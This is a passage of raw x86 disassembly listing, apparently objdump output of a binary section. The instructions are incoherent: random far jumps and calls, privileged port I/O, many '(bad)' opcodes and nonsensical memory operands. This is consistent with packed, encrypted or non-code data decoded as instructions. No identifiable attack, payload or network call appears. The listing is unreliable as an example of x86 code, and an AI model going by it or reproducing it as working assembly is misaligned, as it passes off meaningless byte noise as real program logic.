  40db54:	sbb    BYTE PTR [ebp-0x5c4a1410],0x36
  40db5b:	mov    WORD PTR [ebp+0x3a97d83a],ss
  40db61:	sbb    al,0xc4
  40db63:	stos   DWORD PTR es:[edi],eax
  40db64:	pop    ecx
  40db65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40db66:	and    al,0x67
  40db68:	out    dx,eax
  40db69:	cld    
  40db6a:	lock adc esp,DWORD PTR ds:0x49b3c2ab
  40db71:	repnz mov bl,BYTE PTR [edi+eiz*1-0x51]
  40db76:	adc    BYTE PTR [ebp-0x149623],cl
  40db7c:	cmp    dh,bl
  40db7e:	add    ebp,DWORD PTR [edi]
  40db80:	adc    dl,BYTE PTR ds:0x67b49c80
  40db86:	loope  0x40db8d
  40db88:	sub    edi,esi
  40db8a:	dec    esi
  40db8b:	mov    esp,gs
  40db8d:	out    0xd2,al
  40db8f:	pop    ebp
  40db90:	jg     0x40db43
  40db92:	mov    cl,0x9d
  40db94:	fisubr WORD PTR [edx+0x20b5b363]
  40db9a:	fcomp  DWORD PTR [eiz*4-0x2b9a4ca3]
  40dba1:	rol    DWORD PTR [eax+0x60],0x3b
  40dba5:	jo     0x40dc10
  40dba7:	loope  0x40dbfd
  40dba9:	jne    0x40db52
  40dbab:	pusha  
  40dbac:	pop    edi
  40dbad:	(bad)  
  40dbae:	adc    al,0xfb
  40dbb0:	sbb    eax,0x44d886c3
  40dbb5:	std    
  40dbb6:	add    ebx,DWORD PTR [ecx-0x55]
  40dbb9:	jno    0x40db9c
  40dbbb:	stos   BYTE PTR es:[edi],al
  40dbbc:	popa   
  40dbbd:	cmp    ecx,DWORD PTR [esi]
  40dbbf:	jmp    0xf148:0x111b761f
  40dbc6:	cld    
  40dbc7:	add    DWORD PTR [ecx-0x5df9bd85],ebx
  40dbcd:	xlat   BYTE PTR ds:[ebx]
  40dbce:	cmp    ebp,ecx
  40dbd0:	dec    edi
  40dbd1:	lods   al,BYTE PTR ds:[esi]
  40dbd2:	in     al,dx
  40dbd3:	in     al,0x28
  40dbd5:	add    DWORD PTR [edi-0x30],edi
  40dbd8:	js     0x40db99
  40dbda:	fs xor cl,dh
  40dbdd:	int    0x68
  40dbdf:	jmp    0xf619:0x5487fe06
  40dbe6:	lock mov ah,0x25
  40dbe9:	bound  esp,QWORD PTR [ebx]
  40dbeb:	push   edx
  40dbec:	add    ebx,ebp
  40dbee:	in     eax,dx
  40dbef:	mov    dh,0xa4
  40dbf1:	in     eax,0xf2
  40dbf3:	and    bh,BYTE PTR [ebx+0x3132fa5a]
  40dbf9:	jnp    0x40dbd2
  40dbfb:	xor    BYTE PTR fs:[edi],bh
  40dbfe:	rcr    DWORD PTR [ecx-0xf],cl
  40dc01:	jecxz  0x40dbb0
  40dc03:	push   0x4a
  40dc05:	sub    edx,ecx
  40dc07:	out    dx,al
  40dc08:	ins    BYTE PTR es:[edi],dx
  40dc09:	loope  0x40dc73
  40dc0b:	mov    ds:0x43a27d55,eax
  40dc10:	adc    eax,0x95a2c7f0
  40dc15:	cwde   
  40dc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc17:	add    ecx,DWORD PTR [ebp+0x109fc53d]
  40dc1d:	enter  0xb524,0xf5
  40dc21:	mov    al,ds:0xc2a5a219
  40dc26:	jns    0x40dbf8
  40dc28:	sbb    DWORD PTR ds:0xaa600d5d,ebp
  40dc2e:	and    eax,0x8df748dd
  40dc33:	(bad)  
  40dc35:	pop    edx
  40dc36:	enter  0x7bfd,0x80
  40dc3a:	jb     0x40dc6a
  40dc3c:	push   eax
  40dc3d:	retf   
  40dc3e:	sub    ebp,DWORD PTR [esp+eax*8+0x19953d88]
  40dc45:	out    0x31,eax
  40dc47:	push   edx
  40dc48:	sbb    DWORD PTR [ebp-0x10affe75],eax
  40dc4e:	mov    DWORD PTR [ebp-0x44a73997],0x5e822c59
  40dc58:	idiv   BYTE PTR [eax]
  40dc5a:	mov    al,0xbc
  40dc5c:	xor    bl,BYTE PTR [esi-0x58b78412]
  40dc62:	loop   0x40dc85
  40dc64:	mov    edi,0x32b6f5e1
  40dc69:	rol    DWORD PTR [edx+0x31],1
  40dc6c:	je     0x40dcc4
  40dc6e:	pslld  mm4,mm7
  40dc71:	dec    esi
  40dc72:	jae    0x40dc74
  40dc74:	loopne 0x40dcd2
  40dc76:	cli    
  40dc77:	loop   0x40dc06
  40dc79:	cdq    
  40dc7a:	mov    bl,0xc5
  40dc7c:	rcr    edi,0x16
  40dc7f:	pop    esi
  40dc80:	ja     0x40dc7f
  40dc82:	inc    ecx
  40dc83:	mov    bh,0xd7
  40dc85:	pop    ebp
  40dc86:	push   ebp
  40dc87:	xor    ebp,DWORD PTR [edx]
  40dc89:	mov    ebp,0x5b9864c8
  40dc8e:	es xchg esp,eax
  40dc90:	mov    esi,0xe471a69a
  40dc95:	repz dec edi
  40dc97:	stos   BYTE PTR es:[edi],al
  40dc98:	inc    ecx
  40dc99:	(bad)  
  40dc9a:	into   
  40dc9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc9c:	cs stos DWORD PTR es:[edi],eax
  40dc9e:	jmp    0x1a3:0x172c76f6
  40dca5:	cwde   
  40dca6:	cli    
  40dca7:	leave  
  40dca8:	leave  
  40dca9:	jae    0x40dc35
  40dcab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcac:	sbb    eax,DWORD PTR [eax+0x4d]
  40dcaf:	mov    al,0x9b
  40dcb1:	and    ch,cl
  40dcb3:	mov    ecx,0x5b3dbfba
  40dcb8:	jbe    0x40dc88
  40dcba:	sub    DWORD PTR [ebp+eiz*1+0x13],esp
  40dcbe:	cmp    al,0x59
  40dcc0:	add    al,0x6f
  40dcc2:	push   ss
  40dcc3:	stos   BYTE PTR es:[edi],al
  40dcc4:	inc    esp
  40dcc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcc6:	jno    0x40dcde
  40dcc8:	data16 loope 0x40dcb8
  40dccb:	ficom  DWORD PTR [ecx+edx*4]
  40dcce:	(bad)
  40dcd1:	sub    dh,dh
  40dcd3:	jmp    0x40dcf6
  40dcd5:	(bad)  
  40dcd6:	neg    bl
  40dcd8:	push   ds
  40dcd9:	(bad)  
  40dcda:	call   0x219b:0x9d2b4293
  40dce1:	aam    0xab
  40dce3:	mul    BYTE PTR [edx+esi*4-0x59]
  40dce7:	push   0x7dd3b219
  40dcec:	or     eax,0x412c1fb3
  40dcf1:	or     al,0xde
  40dcf3:	adc    eax,0x3f5ad509
  40dcf8:	sbb    eax,0xa3f8880f
  40dcfd:	rcl    BYTE PTR [eax+0x640c2702],1
  40dd03:	mov    esp,0xb56f1b0c
  40dd08:	push   0xffffffc2
  40dd0a:	imul   edx,DWORD PTR [eax*8+0x6352ad18],0x8257c52e
  40dd15:	bound  eax,QWORD PTR [edi+0x34]
  40dd18:	sub    ah,BYTE PTR [ebx+0x12]
  40dd1b:	stc    
  40dd1c:	test   eax,0x8707639
  40dd21:	and    ah,BYTE PTR [esi+0x79]
  40dd24:	in     eax,0xb4
  40dd26:	aaa    
  40dd27:	adc    al,0xb6
  40dd29:	(bad)  
  40dd2b:	xor    al,0x2e
  40dd2d:	ss jge 0x40dd2d
  40dd30:	mov    ss,esp
  40dd32:	and    eax,0x8291734
  40dd37:	jbe    0x40dd7f
  40dd39:	mov    dh,0x8e
  40dd3b:	mov    cl,0x40
  40dd3d:	fcomp  QWORD PTR [edi]
  40dd3f:	pop    esp
  40dd40:	shl    DWORD PTR [ecx+0x30],0x4a
  40dd44:	add    BYTE PTR ss:[ecx-0x24d7fe01],cl
  40dd4b:	daa    
  40dd4c:	daa    
  40dd4d:	mov    eax,ds:0xf90c6341
  40dd52:	or     cl,BYTE PTR [ebp+0x72]
  40dd55:	xchg   edi,eax
  40dd56:	ret    0xbeee
  40dd59:	inc    ebp
  40dd5a:	sbb    ebp,DWORD PTR [edi]
  40dd5c:	icebp  
  40dd5d:	scas   eax,DWORD PTR es:[edi]
  40dd5e:	inc    edx
  40dd5f:	mov    eax,ebp
  40dd61:	jle    0x40dcf6
  40dd63:	stc    
  40dd64:	scas   al,BYTE PTR es:[edi]
  40dd65:	scas   eax,DWORD PTR es:[edi]
  40dd66:	in     eax,dx
  40dd67:	test   BYTE PTR [esi],0xc0
  40dd6a:	lock addr16 jbe 0x40dd2c
  40dd6e:	jp     0x40ddc5
  40dd70:	aam    0x3b
  40dd72:	stc    
  40dd73:	pop    ebp
  40dd75:	out    dx,al
  40dd76:	xchg   edx,eax
  40dd77:	mov    ?,WORD PTR [ebx-0x6d]
  40dd7a:	cdq    
  40dd7b:	cwde   
  40dd7c:	push   esi
  40dd7d:	cmp    BYTE PTR [eax],dh
  40dd7f:	or     ch,BYTE PTR [eax]
  40dd81:	out    0x66,eax
  40dd83:	dec    eax
  40dd84:	xor    eax,0xb7dc53ee
  40dd89:	lods   eax,DWORD PTR ds:[esi]
  40dd8a:	jle    0x40dd58
  40dd8c:	add    al,0x10
  40dd8e:	lea    edi,[edx-0x437e2dfb]
  40dd94:	ins    BYTE PTR es:[edi],dx
  40dd95:	jmp    0x40de01
  40dd97:	imul   ecx,DWORD PTR [eax],0x73896d63
  40dd9d:	sahf   
  40dd9e:	xlat   BYTE PTR ds:[ebx]
  40dd9f:	je     0x40dd4b
  40dda1:	dec    eax
  40dda2:	sbb    DWORD PTR [edx-0x6c1643e1],ecx
  40dda8:	mov    BYTE PTR [ecx],al
  40ddaa:	push   es
  40ddab:	cmp    ch,BYTE PTR [eax-0x78]
  40ddae:	sti    
  40ddaf:	adc    dh,dl
  40ddb1:	(bad)  
  40ddb2:	shl    bh,cl
  40ddb4:	sub    al,0xdf
  40ddb6:	jbe    0x40de19
  40ddb8:	jecxz  0x40ddf7
  40ddba:	dec    ebp
  40ddbb:	sbb    al,0x49
  40ddbd:	mov    ebp,0xa3e3b8be
  40ddc2:	leave  
  40ddc3:	lahf   
  40ddc4:	je     0x40dd75
  40ddc6:	scas   al,BYTE PTR es:[edi]
  40ddc7:	mov    ebx,0x393a86e4
  40ddcc:	sbb    bl,BYTE PTR [edx]
  40ddce:	hlt    
  40ddcf:	or     al,0x55
  40ddd1:	enter  0x728b,0xa
  40ddd5:	sar    DWORD PTR [ebp+0x72],cl
  40ddd8:	xor    ebp,DWORD PTR [ecx+eiz*1]
  40dddb:	jecxz  0x40dd6c
  40dddd:	ss xor eax,0x81c660e6
  40dde3:	not    BYTE PTR es:[ecx+0x11]
  40dde7:	dec    ebp
  40dde8:	dec    ebp
  40dde9:	dec    esi
  40ddea:	mov    al,ds:0xa8199d71
  40ddef:	mov    esi,0x3b18236
  40ddf4:	push   ebp
  40ddf5:	mov    edi,0x14a3a483
  40ddfa:	cwde   
  40ddfb:	jae    0x40de50
  40ddfd:	jne    0x40dd8d
  40ddff:	mov    cl,0xb1
  40de01:	imul   edx,DWORD PTR ds:0x39e6caf8,0xffffffd2
  40de08:	out    dx,al
  40de09:	pop    ds
  40de0a:	test   al,0x6f
  40de0c:	or     eax,0xc0d0f069
  40de11:	and    ebp,DWORD PTR [esi-0x5e]
  40de14:	sahf   
  40de15:	push   ebp
  40de16:	cdq    
  40de17:	pushf  
  40de18:	mov    dl,BYTE PTR [edi+0x2]
  40de1b:	adc    DWORD PTR [esi+edi*2],edi
  40de1e:	setb   BYTE PTR [edx+0x296f36cc]
  40de25:	cmp    ah,dl
  40de27:	fisubr WORD PTR [edx-0x5d6c436e]
  40de2d:	jmp    0xecf9:0x1214ff46
  40de34:	hlt    
  40de35:	mov    al,ds:0xc9fb78b0
  40de3a:	out    dx,al
  40de3b:	jno    0x40ddfb
  40de3d:	and    DWORD PTR [eax-0x4f25def7],ecx
  40de43:	fwait
  40de44:	pop    esi
  40de45:	test   DWORD PTR [ebx+ebp*1],esp
  40de48:	inc    edi
  40de49:	out    0xcd,al
  40de4b:	or     DWORD PTR [eax-0x30],edx
  40de4e:	fiadd  DWORD PTR [ecx+edi*8]
  40de51:	jmp    0x40ded1
  40de53:	jmp    0x1559:0x971c521e
  40de5a:	jo     0x40ddff
  40de5c:	dec    ebp
  40de5d:	sub    eax,edi
  40de5f:	push   ebp
  40de60:	ins    DWORD PTR es:[edi],dx
  40de61:	aaa    
  40de62:	xchg   DWORD PTR [edi-0x2],edi
  40de65:	push   ecx
  40de66:	cmp    ah,BYTE PTR [edi+0x4aaaba8d]
  40de6c:	jp     0x4e298c
  40de72:	daa    
  40de73:	shr    edi,0x12
  40de76:	cwde   
  40de77:	fistp  QWORD PTR [esi]
  40de79:	stos   BYTE PTR es:[edi],al
  40de7a:	in     eax,0xf9
  40de7c:	pop    esi
  40de7d:	mov    cl,0xcf
  40de7f:	popa   
  40de80:	mov    cl,0x2d
  40de82:	pop    ds
  40de83:	push   edi
  40de84:	retf   0x93ef
  40de87:	inc    ebp
  40de88:	cmp    eax,0x6074b557
  40de8d:	outs   dx,BYTE PTR ds:[esi]
  40de8e:	push   esp
  40de8f:	push   edi
  40de90:	mov    ch,0xd8
  40de92:	add    bh,dl
  40de94:	mov    DWORD PTR [eax+0x45],ecx
  40de97:	stos   BYTE PTR es:[edi],al
  40de98:	xor    ebx,DWORD PTR [ebp-0x26]
  40de9b:	inc    esi
  40de9c:	xor    BYTE PTR [ebp-0x2219756a],ch
  40dea2:	pop    ds
  40dea3:	ja     0x40df20
  40dea5:	into   
  40dea6:	in     al,dx
  40dea7:	mov    esp,0x2099a38d
  40deac:	neg    BYTE PTR [ebx+0x2b]
  40deaf:	leave  
  40deb0:	test   eax,0xefb5c6ef
  40deb5:	jg     0x40de46
  40deb7:	mul    BYTE PTR [ebx+ebp*8+0x404da39]
  40debe:	xor    esp,esp
  40dec0:	mov    esp,0x370c724c
  40dec5:	shl    edi,cl
  40dec7:	inc    edx
  40dec8:	adc    al,0xd4
  40deca:	sub    dh,dh
  40decc:	mov    ecx,DWORD PTR [ecx-0x307bfc3e]
  40ded2:	mov    bl,BYTE PTR [edi+0x41]
  40ded5:	sar    DWORD PTR [ecx+0x222ce783],0x5
  40dedc:	xchg   ebx,eax
  40dedd:	jmp    0x1858:0x9ecd2ec5
  40dee4:	je     0x40deb3
  40dee6:	test   BYTE PTR [ebx+0x32009d4f],bh
  40deec:	btc    esp,edi
  40deef:	add    DWORD PTR [ecx],ebx
  40def1:	fisttp DWORD PTR [ecx+0x4b]
  40def4:	mov    ebp,DWORD PTR [edx+edx*4-0x37c6ac31]
  40defb:	(bad)  
  40defc:	lds    esp,FWORD PTR [edx+0x68491899]
  40df02:	imul   eax,DWORD PTR [edx+0x5e9b216b],0xde2dfc82
  40df0c:	or     edx,esp
  40df0e:	push   ebx
  40df0f:	rcr    ah,cl
  40df11:	fidivr DWORD PTR [edi]
  40df13:	push   ecx
  40df14:	fst    st(1)
  40df16:	out    0x1e,eax
  40df18:	jge    0x40df28
  40df1a:	cwde   
  40df1b:	xor    DWORD PTR [ebx],ebp
  40df1d:	add    esi,DWORD PTR [eax]
  40df1f:	push   ebx
  40df20:	xchg   esi,eax
  40df21:	aam    0x7f
  40df23:	shl    DWORD PTR [eax-0x73cadf31],0x10
  40df2a:	xor    ebx,DWORD PTR [ebx-0x7a]
  40df2d:	jno    0x40df39
  40df2f:	mov    al,ds:0xfd647302
  40df34:	and    eax,0xcbc921bf
  40df39:	sbb    edx,DWORD PTR [ecx]
  40df3b:	loopne 0x40df46
  40df3d:	cmp    edi,esi
  40df3f:	inc    esi
  40df40:	jae    0x40df14
  40df42:	add    al,BYTE PTR [esi+0x4a13fe45]
  40df48:	ficomp WORD PTR [ebp+0x27be592f]
  40df4e:	jbe    0x40dfc0
  40df50:	push   esp
  40df51:	loop   0x40df4c
  40df53:	xchg   esp,eax
  40df54:	in     al,dx
  40df55:	fldcw  WORD PTR ds:0xa026783c
  40df5b:	std    
  40df5c:	jmp    0xfdbea133
  40df61:	dec    esi
  40df62:	pop    ecx
  40df63:	xchg   ecx,eax
  40df64:	xchg   ebp,eax
  40df65:	scas   eax,DWORD PTR es:[edi]
  40df66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df67:	pop    ebp
  40df68:	pop    ebp
  40df69:	(bad)  
  40df6a:	stos   BYTE PTR es:[edi],al
  40df6b:	addr16 jbe 0x40df5a
  40df6e:	adc    esi,DWORD PTR [ebx-0x7b2b8800]
  40df74:	jns    0x40dfcd
  40df76:	xchg   esi,eax
  40df77:	out    dx,eax
  40df78:	pop    edi
  40df79:	jl     0x8cee84fd
  40df7f:	js     0x40df94
  40df81:	jge    0x40dfc0
  40df83:	fcomp  QWORD PTR [ebx+ecx*1-0x20744c14]
  40df8a:	arpl   WORD PTR [ecx],si
  40df8c:	shl    BYTE PTR [ebx-0x39c8416],cl
  40df92:	or     DWORD PTR [ecx+0x1],edx
  40df95:	hlt    
  40df96:	inc    ecx
  40df97:	lods   eax,DWORD PTR ds:[esi]
  40df98:	cld    
  40df99:	jle    0x40df8d
  40df9b:	mov    eax,0xadbe284a
  40dfa0:	daa    
  40dfa1:	push   eax
  40dfa2:	mov    eax,ds:0x6d55787f
  40dfa7:	stos   BYTE PTR es:[edi],al
  40dfa8:	add    dh,BYTE PTR [edi+0x55]
  40dfab:	loope  0x40dfa6
  40dfad:	cli    
  40dfae:	ins    BYTE PTR es:[edi],dx
  40dfaf:	lods   eax,DWORD PTR ds:[esi]
  40dfb0:	jno    0x40df4e
  40dfb2:	iret   
  40dfb3:	push   ebx
  40dfb4:	es sub edx,ebp
  40dfb7:	inc    eax
  40dfb8:	ins    BYTE PTR es:[edi],dx
  40dfb9:	fcomp  DWORD PTR [ebx-0x5d]
  40dfbc:	in     eax,0xcc
  40dfbe:	mov    ds:0x5da5a400,al
  40dfc3:	cmp    DWORD PTR [ebp-0x1189103],edx
  40dfc9:	mov    ss,WORD PTR [edx-0x6a]
  40dfcc:	test   DWORD PTR [esi],0x338260e9
  40dfd2:	cmp    eax,0x594995d0
  40dfd7:	xchg   ebx,eax
  40dfd8:	jle    0x40dfd6
  40dfda:	loope  0x40dfdb
  40dfdc:	fld    DWORD PTR [esi+0x32]
  40dfdf:	push   ebp
  40dfe0:	inc    ecx
  40dfe1:	mov    eax,0x841e2926
  40dfe6:	outs   dx,BYTE PTR ds:[esi]
  40dfe7:	fcomi  st,st(0)
  40dfe9:	fs in  eax,0xa5
  40dfec:	fwait
  40dfed:	call   0x6708:0x1da4b2ab
  40dff4:	ror    ecx,1
  40dff6:	dec    ebp
  40dff7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dff8:	frstor [edi]
  40dffa:	bound  eax,QWORD PTR [ecx+0x58]
  40dffd:	pop    esp
  40dffe:	pop    ss
  40dfff:	add    bl,BYTE PTR ds:0x576ce04b
  40e005:	(bad)  
  40e006:	push   ebp
  40e007:	popa   
  40e008:	dec    ecx
  40e009:	ret    
  40e00a:	shl    BYTE PTR [ecx+ebx*8-0x298a7856],0xfa
  40e012:	xchg   ebx,eax
  40e013:	inc    esi
  40e014:	xor    eax,0xac36b8db
  40e019:	jl     0x40e079
  40e01b:	cmp    al,0xb4
  40e01d:	lahf   
  40e01e:	inc    ecx
  40e01f:	shl    DWORD PTR [esi-0x72],1
  40e022:	adc    DWORD PTR ds:0x3f07a442,ebx
  40e028:	xor    eax,0x11dbcc5a
  40e02d:	mov    ecx,0x799c0291
  40e032:	ins    DWORD PTR es:[edi],dx
  40e033:	cmp    esi,DWORD PTR [esi+0x6b483afc]
  40e039:	and    dl,al
  40e03b:	and    ecx,ebx
  40e03d:	aas    
  40e03e:	(bad)  
  40e03f:	fcom   DWORD PTR [eax-0x1b4975c1]
  40e045:	xchg   ecx,eax
  40e046:	in     eax,0x29
  40e048:	mov    bl,0xd2
  40e04a:	fidivr WORD PTR [ebx+0x6190fdf9]
  40e050:	mov    esi,0x54826b36
  40e055:	jge    0x40e04d
  40e057:	cmc    
  40e058:	icebp  
  40e059:	push   esi
  40e05a:	add    ebp,DWORD PTR [ecx+0x57]
  40e05d:	add    DWORD PTR [edx-0x6],ebx
  40e060:	jno    0x40dfe8
  40e062:	adc    DWORD PTR [edx-0x33e6b2bb],esi
  40e068:	cmp    al,0x2e
  40e06a:	xor    bh,BYTE PTR [ebx]
  40e06c:	sbb    eax,0xfffffff1
  40e06f:	cmp    edi,DWORD PTR [edx-0x23023e6]
  40e075:	xchg   edx,eax
  40e076:	lds    esi,FWORD PTR [esi-0x6551bf18]
  40e07c:	ja     0x40e0d9
  40e07e:	mul    BYTE PTR [ebx]
  40e080:	pusha  
  40e081:	inc    edx
  40e082:	mov    ebx,0x398fa589
  40e087:	mov    ds:0x9d40046f,eax
  40e08c:	push   edx
  40e08d:	jmp    0x40e057
  40e08f:	enter  0x7637,0xb0
  40e093:	mov    esp,0xf520bad0
  40e098:	icebp  
  40e099:	sub    BYTE PTR [eax],ah
  40e09b:	(bad)  
  40e09c:	mov    eax,ds:0x452b553e
  40e0a1:	push   cs
  40e0a2:	pushf  
  40e0a3:	add    DWORD PTR ds:0xee27af0d,esi
  40e0a9:	out    0xc7,al
  40e0ab:	mov    ah,0xd0
  40e0ad:	retf   0x741b
  40e0b0:	pop    esi
  40e0b1:	push   ebp
  40e0b2:	add    ecx,edx
  40e0b4:	stos   DWORD PTR es:[edi],eax
  40e0b5:	add    DWORD PTR [eax+0x2f],ecx
  40e0b8:	or     BYTE PTR [ecx+0xccebd6],0x86
  40e0bf:	(bad)  
  40e0c0:	mov    dh,0x34
  40e0c2:	aaa    
  40e0c3:	fmul   DWORD PTR [ebx+0x3e634870]
  40e0c9:	xchg   esp,eax
  40e0ca:	leave  
  40e0cb:	dec    ecx
  40e0cc:	mov    edx,DWORD PTR [edx]
  40e0ce:	fisttp DWORD PTR [ecx+0x1e4c1378]
  40e0d4:	or     al,0x33
  40e0d6:	(bad)  
  40e0d7:	lock add eax,0x9cd11bcd
  40e0dd:	pop    ecx
  40e0de:	jns    0x40e155
  40e0e0:	(bad)  
  40e0e1:	(bad)  
  40e0e2:	xchg   esp,eax
  40e0e3:	add    DWORD PTR [edx],0xfffffffa
  40e0e6:	sub    eax,0x4d6c6124
  40e0eb:	jns    0x40e0be
  40e0ed:	jecxz  0x40e12f
  40e0ef:	loope  0x40e0de
  40e0f1:	sub    DWORD PTR [ecx+0x60849e97],esp
  40e0f7:	sti    
  40e0f8:	fwait
  40e0f9:	stos   BYTE PTR es:[edi],al
  40e0fa:	ret    0x2b85
  40e0fd:	rcr    esp,0x30
  40e100:	fnsave ds:0x6b25a02c
  40e106:	inc    ebx
  40e107:	ret    0x975e
  40e10a:	dec    esi
  40e10b:	jns    0x40e104
  40e10d:	ror    ebx,1
  40e10f:	jl     0x40e158
  40e111:	add    dl,BYTE PTR [ebx-0x38]
  40e114:	sub    bl,BYTE PTR [ecx+0x67]
  40e117:	inc    esi
  40e118:	int3   
  40e119:	xchg   ah,ah
  40e11b:	xchg   ebx,eax
  40e11c:	or     bh,ah
  40e11e:	popf   
  40e11f:	sbb    al,0x61
  40e121:	fistp  WORD PTR [ebp+0x746f844c]
  40e127:	pusha  
  40e128:	or     DWORD PTR [ebx],0x12
  40e12b:	daa    
  40e12c:	scas   al,BYTE PTR es:[edi]
  40e12d:	pop    edi
  40e12e:	mov    esp,0xc089f4b1
  40e133:	add    BYTE PTR [edx],dh
  40e135:	mov    ecx,0x50b07925
  40e13a:	xchg   ebx,eax
  40e13b:	sub    eax,0xda977922
  40e140:	ins    DWORD PTR es:[edi],dx
  40e141:	mov    esp,0xab02a430
  40e146:	xchg   ah,al
  40e148:	dec    esp
  40e149:	dec    esp
  40e14a:	sbb    ch,ah
  40e14c:	js     0x40e139
  40e14e:	test   eax,0x993c7d39
  40e153:	scas   al,BYTE PTR es:[edi]
  40e154:	sub    eax,0x74963d9f
  40e159:	ret    
  40e15a:	mov    ch,dl
  40e15c:	fsubrp st(0),st
  40e15e:	jmp    0xdb82:0x2e208ac8
  40e165:	mov    eax,0xfc2b0fec
  40e16a:	jo     0x40e1da
  40e16c:	inc    edi
  40e16d:	and    ah,BYTE PTR [ebx]
  40e16f:	mov    ch,0xde
  40e171:	mov    al,ds:0x4b641a77
  40e176:	push   eax
  40e177:	aaa    
  40e178:	shl    DWORD PTR [eax+0x97eb8c6],1
  40e17e:	icebp  
  40e17f:	fild   DWORD PTR [ecx]
  40e181:	push   ebp
  40e182:	mov    al,0x0
  40e184:	and    al,BYTE PTR [ecx+eiz*4+0x64]
  40e188:	mov    esp,eax
  40e18a:	pop    edx
  40e18b:	adc    al,0x36
  40e18d:	sub    bh,BYTE PTR ds:0x6d8e67cc
  40e193:	cmp    BYTE PTR [ecx+0x1d],0xa
  40e197:	push   esp
  40e198:	stos   BYTE PTR es:[edi],al
  40e199:	or     DWORD PTR [ebx],esp
  40e19b:	rcr    ecx,1
  40e19d:	xchg   ebx,eax
  40e19e:	fwait
  40e19f:	sub    BYTE PTR [eax+eiz*1+0x13],bl
  40e1a3:	arpl   si,bp
  40e1a5:	js     0x40e1f0
  40e1a7:	xchg   ecx,eax
  40e1a8:	xchg   esp,eax
  40e1a9:	xor    BYTE PTR [ebp+0x6a],bl
  40e1ac:	fidivr DWORD PTR [edi-0x5f295d88]
  40e1b2:	xor    BYTE PTR [ebx-0x17],bh
  40e1b5:	sub    dl,cl
  40e1b7:	jne    0x40e22c
  40e1b9:	loop   0x40e190
  40e1bb:	loopne 0x40e170
  40e1bd:	mov    dl,0xc8
  40e1bf:	out    0x6a,eax
  40e1c1:	mov    dl,0x67
  40e1c3:	fstp   DWORD PTR [edi]
  40e1c5:	jae    0x40e157
  40e1c7:	xor    DWORD PTR [ebp-0x78],0x495ce3f4
  40e1ce:	and    al,0x29
  40e1d0:	loop   0x40e207
  40e1d2:	and    al,0x74
  40e1d4:	jno    0x40e1e6
  40e1d6:	out    0xdf,al
  40e1d8:	outs   dx,BYTE PTR fs:[esi]
  40e1da:	mov    edx,DWORD PTR [ecx]
  40e1dc:	cmp    DWORD PTR [esi],0x82072940
  40e1e2:	and    eax,0xc2b97d44
  40e1e7:	out    dx,eax
  40e1e8:	mov    al,ds:0x55ab13c4
  40e1ed:	or     cl,BYTE PTR ds:[ecx-0x25942883]
  40e1f4:	and    eax,0x780528a6
  40e1f9:	mov    esp,0x4ce9316f
  40e1fe:	cmp    BYTE PTR [esi-0x3c],bl
  40e201:	cvttps2dq xmm0,XMMWORD PTR [edx-0x2f]
  40e206:	ror    DWORD PTR [edi-0x44],0xd8
  40e20a:	dec    esp
  40e20b:	mov    al,0x2e
  40e20d:	cdq    
  40e20e:	xchg   edx,eax
  40e20f:	mov    edx,ebp
  40e211:	fcompp 
  40e213:	pusha  
  40e214:	and    al,0x5f
  40e216:	jmp    0x40e291
  40e218:	les    ebp,FWORD PTR [eax]
  40e21a:	mov    al,ds:0x22a41110
  40e21f:	push   es
  40e220:	pop    ecx
  40e221:	mov    BYTE PTR [edi],dl
  40e223:	sbb    al,0xdc
  40e225:	and    eax,0x5e4d9f8f
  40e22a:	in     al,dx
  40e22b:	xor    BYTE PTR ds:0x9209bfed,dl
  40e231:	int3   
  40e232:	(bad)  
  40e234:	aam    0xf8
  40e236:	std    
  40e237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e238:	stos   BYTE PTR es:[edi],al
  40e239:	pop    ebp
  40e23a:	sub    eax,0x9b00ed36
  40e23f:	clc    
  40e240:	lds    esi,FWORD PTR [ebp-0x31342741]
  40e246:	out    dx,eax
  40e247:	jg     0x40e2c5
  40e249:	push   ebp
  40e24a:	push   es
  40e24b:	cwde   
  40e24c:	mov    ebx,0xd0e64da8
  40e251:	call   0xcc38:0xbf034a97
  40e258:	cmp    DWORD PTR [edx-0x22],ebx
  40e25b:	das    
  40e25c:	add    ch,BYTE PTR [ebx+0x3c]
  40e25f:	push   0xb09c57aa
  40e264:	jl     0x40e27c
  40e266:	or     eax,DWORD PTR [ebx+0x22]
  40e269:	mov    eax,ds:0x7aec550d
  40e26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e26f:	jge    0x40e2c7
  40e271:	ret    
  40e272:	pop    ds
  40e273:	mov    bh,0x91
  40e275:	sahf   
  40e276:	imul   edi,DWORD PTR [ecx],0xffffff9b
  40e279:	aas    
  40e27a:	and    eax,0xf5ab927c
  40e27f:	fwait
  40e280:	mov    ebp,0xae0b7473
  40e285:	imul   edx,ecx,0x4f
  40e288:	scas   eax,DWORD PTR es:[edi]
  40e289:	jmp    0xca6:0xf573c246
  40e290:	ins    DWORD PTR es:[edi],dx
  40e291:	inc    esi
  40e292:	xor    esi,DWORD PTR [edi+0x48]
  40e295:	test   BYTE PTR [ecx-0x610739e4],dh
  40e29b:	push   edi
  40e29c:	sbb    ebx,DWORD PTR [edi-0x67]
  40e29f:	or     ebp,DWORD PTR [ecx]
  40e2a1:	adc    edx,DWORD PTR [esi+0x3fc059eb]
  40e2a7:	pop    ebx
  40e2a8:	jp     0x40e268
  40e2aa:	push   eax
  40e2ab:	add    eax,0x15d0bbdb
  40e2b0:	stos   DWORD PTR es:[edi],eax
  40e2b1:	mov    al,ds:0x48226742
  40e2b6:	vmaxsd xmm0,xmm5,QWORD PTR [eax-0x2de33776]
  40e2bf:	mov    bl,0x8b
  40e2c1:	dec    ebx
  40e2c2:	adc    BYTE PTR [edx+0x64],bl
  40e2c5:	fwait
  40e2c6:	cmp    eax,0x24b6050b
  40e2cb:	scas   al,BYTE PTR es:[edi]
  40e2cc:	add    eax,0x514ded69
  40e2d1:	sub    esp,DWORD PTR [ebp+0x4fd8208b]
  40e2d7:	gs inc esi
  40e2d9:	je     0x40e340
  40e2db:	add    al,0x7e
